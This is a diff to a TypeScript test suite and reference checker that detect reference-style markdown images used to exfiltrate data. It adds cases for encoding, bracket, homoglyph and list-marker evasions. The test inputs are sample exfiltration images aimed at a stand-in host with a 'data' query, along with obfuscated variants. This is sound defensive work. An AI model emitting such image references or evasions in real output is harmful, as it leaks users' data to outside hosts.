@@ -67,6 +67,31 @@ describe('reference-style markdown image exfiltration (#219)', () => {
     expect(flags('![x][r]\r\r[r]:\rhttps://c.example/p.png?data=1')).toBe(true);
     expect(flags('![x][r]\r\n\r\n[r]:\r\nhttps://c.example/p.png?data=1')).toBe(true);
   });
+  it('reads the alt text more than one way, so a stray bracket cannot hide the image', () => {
+    expect(flags(`![a \`[\` b][r]\n\n${DEF}`)).toBe(true); // a bracket in a code span
+    expect(flags(`![see \`arr[0\` here][r]\n\n${DEF}`)).toBe(true); // an unpaired bracket
+    expect(flags(`![a <http://q.example/[> b][r]\n\n${DEF}`)).toBe(true); // a bracket in an autolink
+    expect(flags(`![see \`]\` here][r]\n\n${DEF}`)).toBe(true); // a `]` in a code span closes the paired reading early
+    expect(flags(`![a ] b][r]\n\n${DEF}`)).toBe(true);
+  });
+  it('scans the raw text: fullwidth brackets and non-Latin letters in labels are just characters', () => {
+    expect(flags(`![chart \uff3bfig 1][r]\n\n${DEF}`)).toBe(true);
+    expect(flags('![a][\u0422oken]\n\n[\u0442oken]: https://c.example/p.png?data=1')).toBe(true); // Cyrillic T / t
+    expect(flags(`![a\n\u00a0\nb][r]\n\n${DEF}`)).toBe(true); // a line of only NBSP is not blank
+  });
+  it('has no label length cap, and accepts list markers before a definition', () => {
+    expect(flags(`![x][${'l'.repeat(1500)}]\n\n[${'l'.repeat(1500)}]: https://c.example/p.png?data=1`)).toBe(true);
+    expect(flags('![x][r]\n\n- [r]: https://c.example/p.png?data=1')).toBe(true);
+    expect(flags('![x][r]\n\n1. [r]: https://c.example/p.png?data=1')).toBe(true);
+    expect(flags('![x][r]\n\n- > [r]: https://c.example/p.png?data=1')).toBe(true);
+  });
+  it('decodes the URL before looking for the keyword', () => {
+    for (const url of ['https://c.example/p.png?%64ata=1', 'https://c.example/p.png?d&#97;ta=1', 'https://c.example/p&#63;data=1', 'https://c.example/p.png?\uff44\uff41\uff54\uff41=1', 'https://c.example/p.png?da\u200bta=1']) {
+      expect(flags(`![x][r]\n\n[r]: ${url}`), url).toBe(true);
+    }
+    expect(flags('![x][r]\n\n[r]: <https://c.example/p.png?q=1 data=S>')).toBe(true); // a space inside <...>
+    expect(flags('![x][r]\n\n[r]: https://c.example/p.png?v=%64')).toBe(false); // decodes to `d`, not a keyword
+  });
   it('folds case the way CommonMark does', () => {
     expect(flags('![x][STRASSE]\n\n[stra\u00dfe]: https://c.example/p.png?data=1')).toBe(true);
     expect(flags('![x][Stra\u00dfe]\n\n[STRASSE]: https://c.example/p.png?data=1')).toBe(true);
@@ -151,28 +176,38 @@ function reference(content: string): Array<[number, number]> {
   const isBreakChar = (c: string | undefined) => c === '\n' || c === '\r';
   const isWs = (c: string) => /\s/.test(c);
   const norm = (s: string) => s.trim().replace(/\s+/g, ' ').toLowerCase().toUpperCase().toLowerCase();
-  /** Position after the line break at i (CRLF counts as one), or i if there is none. */
   const afterBreak = (i: number) => (content[i] === '\r' && content[i + 1] === '\n' ? i + 2 : isBreakChar(content[i]) ? i + 1 : i);
-  /** True when the line starting at i holds nothing but spaces and tabs. */
   const blankLineAt = (i: number) => {
     let k = i;
     while (content[k] === ' ' || content[k] === '\t') k++;
     return k >= n || isBreakChar(content[k]);
   };
-  const flaggedUrl = (url: string): boolean => {
-    let u = url.startsWith('<') ? url.slice(1) : url;
+  const decode = (url: string): string => {
+    let u = url.normalize('NFKC');
+    u = Array.from(u).filter((ch) => !'­​‌‍⁠﻿'.includes(ch)).join('');
+    u = u.replace(/&#(\d{1,7});/g, (m, d) => { const cp = Number(d); return cp > 0 && cp <= 0x10ffff ? String.fromCodePoint(cp) : m; });
+    u = u.replace(/&#[xX]([0-9a-fA-F]{1,6});/g, (m, h) => { const cp = parseInt(h, 16); return cp > 0 && cp <= 0x10ffff ? String.fromCodePoint(cp) : m; });
+    u = u.replace(/&(amp|lt|gt|quot|apos);/g, (_m, name) => ({ amp: '&', lt: '<', gt: '>', quot: '"', apos: "'" } as Record<string, string>)[name]);
+    u = u.replace(/%([2-7][0-9A-Fa-f])/g, (m, h) => { const c = String.fromCharCode(parseInt(h, 16)); return /[A-Za-z0-9_-]/.test(c) ? c : m; });
+    return u;
+  };
+  const flaggedUrl = (raw: string): boolean => {
+    const angle = raw.startsWith('<');
+    let u = decode(raw);
+    if (angle) u = u.slice(1);
     const m = /^(?:https?:)?\/\//i.exec(u);
     if (!m) return false;
     u = u.slice(m[0].length);
+    const stops = (ch: string) => (angle ? ch === '>' : isWs(ch) || ch === '>');
     let q = -1;
     for (let i = 0; i < u.length; i++) {
-      if (isWs(u[i]) || u[i] === '>') return false;
+      if (stops(u[i])) return false;
       if (u[i] === '?') { q = i; break; }
     }
     if (q < 0) return false;
     const query = u.slice(q + 1);
     for (let start = 0; start < query.length; start++) {
-      if (isWs(query[start]) || query[start] === '>') return false;
+      if (stops(query[start])) return false;
       for (const k of KEYWORDS) {
         if (query.slice(start, start + k.length).toLowerCase() !== k) continue;
         const nxt = query[start + k.length];
@@ -182,11 +217,7 @@ function reference(content: string): Array<[number, number]> {
     return false;
   };
 
-  /**
-   * Parse a bracketed label whose `[` is at `open`: no unescaped brackets,
-   * backslash escapes, line breaks allowed but not across a blank line.
-   * Returns the index of the closing `]`, or -1.
-   */
+  /** A bracketed label whose `[` is at `open`: no unescaped brackets, escapes, line breaks but no blank line. Returns the `]` index or -1. */
   const labelEnd = (open: number, allowEmpty = false): number => {
     let i = open + 1;
     let items = 0;
@@ -204,26 +235,24 @@ function reference(content: string): Array<[number, number]> {
     }
     return -1;
   };
-  const itemsBetween = (open: number, close: number) => {
-    let items = 0;
-    for (let i = open + 1; i < close; ) {
-      if (content[i] === '\\') i += 2;
-      else if (isBreakChar(content[i])) i = afterBreak(i);
-      else i++;
-      items++;
-    }
-    return items;
-  };
 
   const flagged = new Set<string>();
   for (let i = 0; i <= n; i++) {
-    const lineStart = i === 0 || content[i - 1] === '\n' || content[i - 1] === '\r' || content[i - 1] === '\u2028' || content[i - 1] === '\u2029';
+    const lineStart = i === 0 || content[i - 1] === '\n' || content[i - 1] === '\r' || content[i - 1] === ' ' || content[i - 1] === ' ';
     if (!lineStart) continue;
     let p = i;
-    while (content[p] === ' ' || content[p] === '\t' || content[p] === '>') p++;
+    for (;;) {
+      const c = content[p];
+      if (c === ' ' || c === '\t' || c === '>') { p++; continue; }
+      if ((c === '-' || c === '*' || c === '+') && (content[p + 1] === ' ' || content[p + 1] === '\t')) { p++; continue; }
+      let d = p;
+      while (d < n && d - p < 9 && content[d] >= '0' && content[d] <= '9') d++;
+      if (d > p && (content[d] === '.' || content[d] === ')') && (content[d + 1] === ' ' || content[d + 1] === '\t')) { p = d + 1; continue; }
+      break;
+    }
     if (content[p] !== '[') continue;
     const e = labelEnd(p);
-    if (e < 0 || itemsBetween(p, e) > 999 || content[e + 1] !== ':') continue;
+    if (e < 0 || content[e + 1] !== ':') continue;
     let d = e + 2;
     while (content[d] === ' ' || content[d] === '\t') d++;
     if (isBreakChar(content[d])) { d = afterBreak(d); while (content[d] === ' ' || content[d] === '\t' || content[d] === '>') d++; }
@@ -242,7 +271,7 @@ function reference(content: string): Array<[number, number]> {
     if (flaggedUrl(dest)) flagged.add(norm(content.slice(p + 1, e)));
   }
 
-  /** Match of the `[` at `open` with nesting (blank lines end the search). */
+  /** Reading A: the `[` at `open` paired with its `]` by nesting; blank lines end the search. */
   const nestedEnd = (open: number): { end: number; inner: boolean } | undefined => {
     let depth = 0;
     let inner = false;
@@ -261,33 +290,81 @@ function reference(content: string): Array<[number, number]> {
     }
     return undefined;
   };
+  /** Reading B: the first unescaped `]` after the `[` at `open`, before a blank line. */
+  const firstEnd = (open: number): { end: number; inner: boolean } | undefined => {
+    let inner = false;
+    for (let i = open + 1; i < n; ) {
+      const c = content[i];
+      if (c === '\\') { i += 2; continue; }
+      if (c === '[') inner = true;
+      else if (c === ']') return { end: i, inner };
+      else if (isBreakChar(c)) {
+        const next = afterBreak(i);
+        if (blankLineAt(next)) return undefined;
+        i = next;
+        continue;
+      }
+      i++;
+    }
+    return undefined;
+  };
 
-  const out: Array<[number, number]> = [];
-  let i = 0;
-  while (i < n) {
-    if (!(content[i] === '!' && content[i + 1] === '[')) { i++; continue; }
-    const alt = nestedEnd(i + 1);
-    if (!alt) { i++; continue; }
+  const hits: Array<[number, number]> = []; // [start, end)
+  const readImage = (at: number, alt: { end: number; inner: boolean }) => {
     const afterAlt = alt.end + 1;
     let end = afterAlt;
     let label: string | undefined;
     if (content[afterAlt] === '[') {
       const le = labelEnd(afterAlt, true);
-      if (le >= 0 && itemsBetween(afterAlt, le) <= 999) {
+      if (le >= 0) {
         end = le + 1;
         const explicit = content.slice(afterAlt + 1, le);
         if (explicit.trim() !== '') label = explicit;
-        else if (!alt.inner && alt.end - (i + 2) <= 999) label = content.slice(i + 2, alt.end);
+        else if (!alt.inner) label = content.slice(at + 2, alt.end);
       }
-    } else if (content[afterAlt] === '(') { i++; continue; }
-    if (label === undefined && end === afterAlt && !alt.inner && alt.end - (i + 2) <= 999) label = content.slice(i + 2, alt.end);
+    } else if (content[afterAlt] === '(') return;
+    if (label === undefined && end === afterAlt && !alt.inner) label = content.slice(at + 2, alt.end);
     const key = label === undefined ? '' : norm(label);
-    if (key !== '' && flagged.has(key)) {
-      const last = out[out.length - 1];
-      if (last && i - (last[0] + last[1]) <= 100 && /^\s*$/.test(content.slice(last[0] + last[1], i))) last[1] = end - last[0];
-      else out.push([i, end - i]);
+    if (key !== '' && flagged.has(key)) hits.push([at, end]);
+  };
+  for (let i = 0; i < n - 1; i++) {
+    if (!(content[i] === '!' && content[i + 1] === '[')) continue;
+    const a = nestedEnd(i + 1);
+    const b = firstEnd(i + 1);
+    if (a) readImage(i, a);
+    if (b && !(a && a.end === b.end)) readImage(i, b);
+  }
+  // Reading C: any `][label]` after a `![` in the same paragraph is an image to that label.
+  let lastBang = -1;
+  for (let i = 0; i < n; ) {
+    const c = content[i];
+    if (c === '\\') { i += 2; continue; }
+    if (c === '[' && i > 0 && content[i - 1] === '!') lastBang = i - 1;
+    if (c === ']' && lastBang >= 0 && content[i + 1] === '[') {
+      const le = labelEnd(i + 1);
+      if (le >= 0) {
+        const key = norm(content.slice(i + 2, le));
+        if (key !== '' && flagged.has(key)) hits.push([lastBang, le + 1]);
+      }
     }
-    i = end;
+    if (isBreakChar(c)) {
+      const next = afterBreak(i);
+      if (blankLineAt(next)) lastBang = -1;
+      i = next;
+      continue;
+    }
+    i++;
+  }
+  hits.sort((x, y) => x[0] - y[0] || y[1] - x[1]);
+  const out: Array<[number, number]> = [];
+  for (const [s, e] of hits) {
+    const last = out[out.length - 1];
+    const lastEnd = last ? last[0] + last[1] : 0;
+    if (last && (s < lastEnd || (s - lastEnd <= 100 && /^\s*$/.test(content.slice(lastEnd, s))))) {
+      last[1] = Math.max(lastEnd, e) - last[0];
+    } else {
+      out.push([s, e - s]);
+    }
   }
   return out;
 }
@@ -320,7 +397,7 @@ describe('matches a slow reference on generated documents (#219)', () => {
       const form = rand();
       const l = label(rand);
       if (form < 0.05) return `![${'alt '.repeat(300)}][${l}]`;
-      if (form < 0.12) return pick(rand, ['![a [b] c]', '![a\\]b]', '![first\nsecond]', '![first\r\nsecond]', '![a [b c]', '![[b]]']) + `[${l}]`;
+      if (form < 0.12) return pick(rand, ['![a [b] c]', '![a\\]b]', '![first\nsecond]', '![first\r\nsecond]', '![a [b c]', '![[b]]', '![a `[` b]', '![a `]` b]', '![a <http://q.example/[> b]', '![a ] b]']) + `[${l}]`;
       if (form < 0.16) return pick(rand, ['![a [b] c]', '![first\nsecond]', '![a\\]b]']);
       if (form < 0.4) return `![alt][${l}]`;
       if (form < 0.6) return `![${l}][]`;
@@ -329,7 +406,7 @@ describe('matches a slow reference on generated documents (#219)', () => {
       return `![alt][${l}`;
     }
     if (r < 0.62) {
-      const indent = pick(rand, ['', ' ', '   ', '    ', '\t', '> ', '>> ']);
+      const indent = pick(rand, ['', ' ', '   ', '    ', '\t', '> ', '>> ', '- ', '1. ', '10) ', '- > ', '* ']);
       const sep = pick(rand, [' ', '', '\t', '\n  ', '\n\n']);
       const title = rand() < 0.2 ? ' "title"' : '';
       return `\n${indent}[${label(rand)}]:${sep}${pick(rand, URLS)}${title}\n`;
